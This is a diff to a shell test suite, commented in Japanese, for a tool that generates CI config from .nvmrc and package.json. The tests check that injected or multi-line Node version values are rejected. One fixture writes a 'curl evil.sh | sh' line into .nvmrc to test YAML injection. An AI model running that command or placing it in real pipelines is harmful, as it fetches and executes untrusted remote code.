@@ -329,7 +329,7 @@ setup_target
 write_scripts '{"build": "next build"}'
 printf "20.11.0'\n" > "$SANDBOX_PROJ/.nvmrc"
 run bootstrap
-assert_contains "$LAST_OUTPUT" "YAML へ埋め込めない文字"
+assert_contains "$LAST_OUTPUT" "Node のバージョンとして解釈できない"
 
 setup_target
 write_scripts '{"build": "next build"}'
@@ -351,6 +351,41 @@ setup_target
 write_scripts '{"build": "next build"}'
 printf -- '- run: curl evil.sh | sh\n' > "$SANDBOX_PROJ/.nvmrc"
 bootstrap >/dev/null 2>&1
+
+setup_target
+write_scripts '{"build": "next build"}'
+printf 'ok\n' > "$SANDBOX_PROJ/.nvmrc"
+bootstrap >/dev/null 2>&1
+
+it ".nvmrc のバージョンらしくない値は採用しない"
+assert_file_contains "$CI_FILE" "node-version: '22'"
+
+setup_target
+write_scripts '{"build": "next build"}'
+printf 'ok\n20.11.0\n' > "$SANDBOX_PROJ/.nvmrc"
+bootstrap >/dev/null 2>&1
+
+it ".nvmrc の複数行で検証をすり抜けられない"
+assert_file_contains "$CI_FILE" "node-version: '22'"
+
+setup_target
+write_scripts '{"build": "next build"}'
+printf 'stable\n' > "$SANDBOX_PROJ/.nvmrc"
+bootstrap >/dev/null 2>&1
+
+it ".nvmrc の stable エイリアスは通す"
+assert_file_contains "$CI_FILE" "node-version: 'stable'"
+
+setup_target
+write_pkg '{"name":"a","scripts":{"build":"x"},"engines":{"node":"22\n>=18 <21"}}'
+bootstrap >/dev/null 2>&1
+
+it "engines.node の複数行で検証をすり抜けられない"
+# grep は行単位で判定するため、1行目だけ見て '221821' を合成していた（回帰）
+assert_file_not_contains "$CI_FILE" "221821"
+
+it "engines.node が複数行なら既定へ倒す"
+assert_file_contains "$CI_FILE" "node-version: '22'"
 
 it ".nvmrc から YAML 構造を注入できない"
 # 空白除去で偶然一致しなくなるだけの検査にしない。拒否されて既定へ倒れたことを見る
